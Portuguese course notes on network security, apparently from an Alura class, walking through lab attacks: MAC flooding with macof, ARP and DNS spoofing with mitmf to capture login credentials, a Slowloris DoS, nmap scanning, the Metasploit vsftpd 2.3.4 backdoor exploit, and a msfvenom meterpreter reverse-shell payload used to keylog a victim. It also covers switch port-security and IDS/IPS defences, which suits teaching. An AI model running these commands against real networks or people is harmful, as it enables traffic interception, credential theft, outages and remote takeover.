# Segurança de redes

Aqui veremos como que um hacker acessaria seu computador e ganharia informações do seu sistema de uma forma que você não queria que ele tivesse, de forma a acessar seu switch e ver como ele acessa informações do seu sistema, man in the middle, DOS e ataques vindas do sevidor e do cliente para a sua máquina.

## Hub

O hub como discutido em Redes1.md é um dispositivo que não grava o endereço MAC e o IP das máquinas que estão naquela rede, então se eu tenho um hub com diversas portas disponíveis um hacker pode simplesmente acessar e estar em conectividade com o servidor e as vítimas, e eu posso fazer a análise trafegos dos usuarios com o Wireshark, que me mostra todas as requisições HTTP de alguém, se conseguir filtrar a requisição de login em um site com o hub eu consigo filtrar dados sigilosos de alguém, então pelo hub não conseguir memorizar o endereço de alguém o usuário acaba mandando essa informação para todo mundo conectado no hub, fazendo com que todo mundo conectado aquele hub tenha navegação comprometida e trazendo lentidão na navegação.

Os hubs não conseguem “aprender” qual equipamento está conectado em cada porta. Dessa forma, ele repassa a informação para todas as suas portas, causando uma lentidão em nossa rede, assim como uma potencial vulnerabilidade de segurança visto que um usuário mal-intencionado poderá fazer o uso de análises de protocolos de rede para decifrar o que uma possível vítima estava acessando.

## Switch

Já os switches foram feitos com o objetivo de memorizar cada endereço de MAC de todas as máquinas conectadas a ela. O que já impossibilita esse espalhamento desnecessário de todas as informações em um sistema e isso dificultou a vida do hacker só que ele é sagaz então ele sabe de mais formas de conseguir informações.

Para simular um switch (e outros componentes de rede) no nosso computador nós instalaremos outro programa chamado GNS3 e é capaz que ele tenha um conflito com o wireshark então talvez seja necessário desisntalar o WireShark (por que ele ja tem esse programa na sua instalação).

Com o switch o hacker apenas recebe um protocolo ARP caso o pc da vítima queira apenas se comunicar com um servidor conectado ao mesmo switch, e essa troca de informação entre o IP do switch e o IP do servidor gasta a memória disponível no switch, e se eu mandar tanta informação ao switch ao ponto de estourar essa memória? Isso é interessante, pois aí o switch atuaria como se fosse um hub (já que ele não vai armazenar mais nenhum MAC) e com isso eu consigo rastrear o trafego naquela rede, e esse ataque é bem simples, no kali fariamos assim

```bash
macof -i eth0
```

E no wireshark do GNS3 eu coloco um filtro

```wireshark
ip.addr == <ip de uma das maquinas>
```

### Como proteger o switch ?

Utilizando o https é uma forma de se proteger de um hacker, e com isso além do protocolo http eu terei um protocolo TLS e que dá essa segurança ao usuário para pelo menos não conseguir interceptar a mensagem

```cmd
arp -a
```

Ve todos os IPs onde meu computador já se comunicou antes.

Para configurar um switch vamos ter que usar o packet tracer e primeiro vamos ver quais endereços MACs estão configurados na CLI do switch com:

```cisco
enable
show mac-address-table
```

Depois basta configurar a segurança da porta onde um dos computadores está conectado, e isso faz com:

```cisco
enable
interface fa 0/2 <por exempo>
switchport mode access
switchport port-security mac-address <endereço MAC conectado naquele terminal>
```

Então habilito somente o endereço MAC que está conectado naquela porta, pois somente ele pode se comunicar ali, mais nenhum outro, isso previne a chuva de endereços MAC que um computador pode fazer no switch, se tiver outro endereço MAC na porta a porta desliga (no switch da cisco pelo menos) quando faço alguma comunicação

## Man in the middle

Literalmente o hacker fica no meio da comunicação entre você e o hacker ao forçar com que o endereço mac do seu protocolo passe primeiro para ele e aí ele passa para o roteador, interceptando qualquer tipo de comunicação entre você e o roteador, o contrário também acontece, o roteador manda os métodos get por exemplo para a máquina do hacker antes de passar pra você, com isso ele tem toda a comunicação passando por ele, mas ele te deixa acessar a internet e coisas do tipo, só tem que passar por ele mesmo.

Para realizar esse ataque no linux temos que fazer

```sh
mitmf --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
```

O primeiro ip é do alvo e o segundo é do hacker e o endereço mac que vemos com `arp -a` é alterado quando olhamos pro ip do roteador.

Temos que baixar o programa mitmf, e o tipo de ataque é conhecido como envenenamento da tabela arf ou arf spoofing, com esse comando no terminal eu consigo ver os acessos da vítima

Só que para isso o hacker precisa estar na minha rede interna

O ataque Man In The Middle consiste em explorar a forma sem estado (stateless) na qual o protocolo ARP trabalha. Dessa forma, um Hacker pode usar de ferramentas para enviar respostas desse protocolo com o intuito de manipular a tabela ARP de suas vítimas para ficar assim no meio da comunicação e visualizar o que é trafegado entre os dispositivos manipulados. Um solução para essa ataque seria Vincular IP & MAC no seu roteador, aí você atribui seu IP a seu endereço MAC específico

### Mãos à obra: Realizando o ataque MITM

Nessa etapa, o Kali Linux e a máquina virtual do Windows (caso seja utilizada) deverão estar com as placas de rede configuradas em Conectado a: Placa em modo Bridge

- Vá ao Kali Linux, abra o terminal e faça a instalação da ferramenta para realizar o ataque: apt-get install mitmf
- Uma vez que o download foi concluído, rode o ataque com o seguinte comando: mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]
- Volte ao computador da vítima e abra a página de login: <http://exemplo-login-fraco-alura.herokuapp.com/login> (Pode demorar um pouco para a página carregar, caso não carregue na primeira vez, espera alguns minutos e dê o refresh na página).
- Faça o "cadastro" e pressione o botão Logar
- Volte ao Kali Linux, qual é o resultado?

Opinião do instrutor

Uma vez que o ataque foi executado, manipulamos a tabela ARP da vítima e do roteador e ficamos no meio da comunicação entre ambos. Uma vez que estamos no meio da comunicação, somos capazes de visualizar o tráfego entre a vítima e o roteador. Ao analisar o resultado no Kali Linux, devemos ter o usuário e senha que a vítima havia se cadastrado:

### DNS spoofing

O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.

Ele é um ataque de engenharia social, onde ele clona uma página de login para a vítima com as mesmas características da original e a mesma URL, porém quando vcê se loga a página não vai a lugar nenhum

#### Mãos à obra: DNS Spoofing

Vamos agora alterar a tradução DNS para ser redirecionada para um IP de nosso controle:

Interrompa o teste anterior do MITM pressionando CTRL + C
No terminal coloque um editor de sua preferência, como o Gedit.
Altere a URL do blog da Alura para o endereço IP do Kali Linux e salve o arquivo.
DNS_spoofing

Vá até a opção Show Applications e digite no campo de busca Leafpad
Kali_show_applications

Abra o Leafpad e digite o seguinte código

```html
<html>
<h1>Curso segurança redes da Alura :)</h1>
</html>
```

Salve esse arquivo dentro do diretório /var/www/html com o nome index.html.
Abra outro terminal e inicialize o servidor da apache com o seguinte comando: service apache2 start.
Volte ao primeiro terminal do Kali Linux e execute o ataque com o seguinte código:
mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface] --dns
No computador da vítima feche todas as janelas, abra o browser novamente e limpe o cache, posteriormente digite: blog.alura.com.br. Qual o resultado?
Não clone páginas de websites sem autorização!

VER OPINIÃO DO INSTRUTOR

Uma vez que estamos no meio da comunicação entre a vítima e o roteador, fomos capazes de alterar o redirecionamento de uma URL para um endereço IP de nosso controle. Dessa forma, quando a vítima digitar em seu browser blog.alura.com.br, ela verá o código HTML que colocamos dentro do diretório /var/www/html.`

### Mãos à obra: Instalando a máquina virtual do Windows

A partir dessa etapa, estaremos interagindo mais com a máquina da vítima. Durante as fases de testes, poderá ocorrer variações dos resultados dependendo do sistema operacional. Para manter uma uniformidade dos resultados, sugiro que o aluno tenha instalado o Windows.

Acessar o site da Microsoft.
Selecionar a opção Microsoft Edge on Win 10 Stable e na plataforma selecionar VirtualBox
Posteriormente clicar em Download.Zip
Caso o computador do aluno não tenha 8GB de RAM, sugiro que seja feita a instalação do VirtualBox em outro computador e que seja feito nesse segundo computador a instalação do Windows.
Para realizar a instalação, vá ao VirtualBox e clique na aba Arquivo -> Importar Appliance
Selecione a pasta onde foi feita a extração do download e clique no botão Importar
Clique na aba Configurações
Vá até a aba Sistema e altere a memória para as configurações de seu computador. O mínimo que eu recomendo seria 1024MB
Vá até a aba Rede e altere para Conectado a: Placa em modo Bridge
Obs: Caso o aluno já tenha o Windows instalado em sua máquina, poderá utilizá-lo para os testes.

## Denial of Service (DoS)

Um servidor tem um limite de conexões que ele consegue fazer, o ataque de DoS faz com que o servidor não consiga se conectar com um usuário, pordendo perder vendas e cliques.

O ataque consiste em um usuário que utiliza de formas para consumir os recursos de um serviço (por exemplo, abrir várias conexões) com o objetivo assim de tornar o serviços indisponível para outros usuários.

Um ataque de negação de serviço ou em inglês Denial Of Service (DoS) ocorre quando temos um usuário que utiliza de recursos para causar uma sobrecarga em um sistema com o principal objetivo de torná-lo indisponível para outros usuários.

### Mãos à obra: Slowloris

Um programa que pode ser usado pra esse fim é o slowloris.

Vamos ilustrar um ataque DoS com o Slowloris:

- Baixar o servidor usado para os testes nesse link e extraia para uma pasta de sua preferência
- Uma vez que o arquivo foi baixado, devemos configurá-lo no VirtualBox. Clique na aba Novo e dê um nome para a máquina virtual (Por exemplo: Servidor)
Ajuste o tamanho de memória para seu computador, o mínimo que eu recomendo seria 512MB. Na sequência selecionar a opção Utilizar um disco rígido virtual existente e escolher o arquivo extraído na etapa anterior. Feito isso clique no botão Criar
- Vá até a aba Configurações e altere a placa de rede do servidor para Conectado a: Placa em modo bridge
- Inicialize o servidor, para logar, entre com usuário e senha: msfadmin
- Verifique qual é seu endereço IP digitando o comando: ifconfig
Metasploit
- Com esse endereço IP, vá até a máquina do Hacker e coloque na URL esse endereço IP. Clique no link da Mutillidae e verifique que tudo está funcionando normalmente.
- No Kali Linux, abra o terminal e digite: `git clone https://github.com/llaera/slowloris.pl.git`
- Verifique se o diretório slowloris.pl foi criado digitando o comando: ls.
- Mude para o diretório do slowloris.pl digitando: cd slowloris.pl/.
- Mude a permissão para que seja possível executar o programa através do comando: chmod +x slowloris.pl.
- Rode o programa com: ./slowloris.pl.
- Veja que o slowloris mostra como devemos rodar o programa, coloque no terminal: perl ./slowloris.pl -dns [IP servidor] -timeout 1.
- Abra um browser do seu computador e tente acessar a página da Mutillidae: [IP do servidor]/mutillidae.

Qual o resultado?

O Slowloris abre mútiplas conexões com o alvo de destino e tenta manter essas conexões ativas pelo máximo tempo possível. O Slowloris encaminha continuamente requisições HTTP de forma parcial, as quais não são completadas. Os serviços que são alvos desse ataque podem manter essas conexões abertas aguardando que as requisições iniciadas sejam completadas. Dessa forma, a ideia é que em algum momento, o pool de conexões será consumido e novas requisições legítimas não serão processadas.

Obs: Não use essas técnicas sem autorização!

### IPS e IDS

As redes corporativas possuem alguns equipamentos com o objetivo de verificar o tipo de tráfego que é enviado por seus usuários e caso esse tráfego represente algum possível ataque, que alguma medida seja tomada para evitar que esse ataque se propague.

Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.

O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.

O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.

#### PERGUNTA

Trabalhamos no ramo de vendas de um grande fabricante de equipamentos de rede e fizemos uma visita em uma empresa do ramo financeiro para mostrar nossas soluções. Durante a visita, o diretor técnico nos informou que para eles seria muito importante ter um equipamento que possa garantir uma maior segurança de sua rede e seus servidores web. Ele nos informou que por ser uma empresa do ramo financeiro, uma queda em um link seria muito prejudicial e deseja que nosso equipamento não interfira diretamente na rede. Sabendo disso, qual equipamento podemos oferecer inicialmente e porque?

Uma vez que o diretor técnico nos informou que uma queda no link é muito prejudicial, podemos oferecer inicialmente a solução do Intrusion Detection System (IDS). Isso porque o IDS não é conectado em linha (in-line) com a rede e se tivermos algum tipo de reparo que seja necessário, não terá impacto na rede do cliente.

Ao mesmo tempo, o IDS recebe cópias do tráfego e com isso caso alguma anomalia seja detectada, poderá enviar alarmes para os administradores da rede para que seja possível assim encontrar uma solução para os problemas detectados.

Obs: Embora muitas vezes o IPS possa ser a melhor opção, existem cenários que o IDS pode atender melhor a necessidade do cliente. Quem no fim vai pesar as vantagens e desvantagens é o cliente.

### DDOS (distributed denial of service)

Mesma coisa que o DoS só que invés de ser uma pessoa, ela é realizada por muitas pessoas, e esse é o ataque mais temido por empresas pois ela é extremamente dificil de se localizar, e muitas das pessoas que estão nesse ataque nem sabem disso, pois elas estão infectadas com um worm que é capaz de estar nesse exército contra um determinado serviço.

O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.

Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).

O DDos é um dos ataques mais comuns e também um dos mais temidos por organizações, uma vez que torna-se difícil a identificação dos dispositivos envolvidos e sua prevenção. Segue abaixo os links mostrados das reportagens dos atques DDoS


## Vulnerabilidades do lado do servidor

Mãos à obra: Nmap

Faça uma varredura dos serviços e versões que estão rodando no servidor através do network mapper (nmap):

Abra o terminal e digite: nmap -A [IP do servidor]
Qual o resultado?

VER OPINIÃO DO INSTRUTOR
Opinião do instrutor

O Nmap (Network Mapper) é um programa usado para reconhecimento de hosts e serviços que estão rodando em determinada rede, sendo assim uma ferramenta muito útil para verificar possíveis vulnerabilidades que possam exisitir.

Obs: Não use o nmap e demais testes sem permissão!

Descobrimos com o Nmap os serviços que estão rodando em nosso servidor, na análise, descobrimos que o servidor possui a porta 21 aberta e que a versão referente a esse serviço seria vsftpd 2.3.4.

Vimos no vídeo que essa versão apresenta uma vulnerabilidade, vamos explorá-la com um framework que possui vários códigos com o intuito de explorar vulnerabilidades, os exploits. Temos no Kali Linux o Metasploit, que possui já pré instalado uma série de exploits. Vamos explorar a vulnerabilidade dessa versão com o objetivo de ganhar acesso do servidor.

No Kali Linux, abra o MetasploitMetasploit_icone
Selecione o exploit que iremos usar para explorar essa vulnerabilidade, digitando: use exploit/unix/ftp/vsftpd_234_backdoor
Configure o alvo do teste: set RHOST [IP do servidor]
Rode o código digitando: exploit
Qual foi o resultado?

VER OPINIÃO DO INSTRUTOR
Opinião do instrutor

Ao rodar esse exploit, conseguimos explorar a vulnerabilidade que existia nessa versão, ganhando assim acesso ao servidor:

Vulnerabilidades em sistemas são conhecidos como exploits!

## Reverse Shell

O Reverse Shell seria a forma na qual o comando de uma máquina é obtida através de uma conexão da máquina alvo com a máquina de ataque. Ou seja, a conexão é estabelecida na direção reversa ao qual o ataque é realizada.

Esse tipo de ataque torna-se muito útil, pois é possível que equipamentos de segurança como o Firewall nos conceda permissão de acesso a rede interna uma vez que nosso pacote é um retorno a uma requisição que foi originada por um usuário interno a rede.

é o famoso jogar o bait e esperar que alguém fisgue

### Formas de obter o reverse Shell

Uma das formas de se obter um Reverse Shell seria da vítima clicar em um arquivo malicioso criado por um Hacker e através desse arquivo malicioso ocorrerá uma conexão de reversa com a máquina de ataque.

Tais arquivos podem ser criados por exemplo com o msfvenom, onde podemos especificar o sistema operacional da vitima e como queremos realizar o ataque.

### Desafio: Criação de arquivo

Como desafio, tente recriar o Reverse Shell feito em aula e tente conferir tudo que a vítima digitou em seu teclado.

Dicas:

Utilize o framework do Metasploit e a função msfvenom. Lembre-se de colocar o payload: windows/meterpreter/reverse_tcp, LHOST e salve esse arquivo com extensão .exe
Na sequência, prepare o Kali Linux para receber essa conexão reversa. Lembre-se de utilizar o exploit/multi/handler, de setar o payload que estamos aguardando de retorno: windows/meterpreter/reverse_tcp e de informar o endereço IP local LHOST. Por fim rode esse código com exploit
Mande esse arquivo para o computador do Windows e execute o arquivo
Utilize o keylogrecorder para gravar as informações da vítima
Não faça isso com outras pessoas

VER OPINIÃO DO INSTRUTOR

Veja o quão perigoso esse ataque pode ser. Descobrimos através da rede social a empresa que o João havia trabalhado e pelo fato dele já conhecer essa empresa, ele clicou no nosso link e conseguimos ganhar acesso a tudo o que ele digitava no teclado
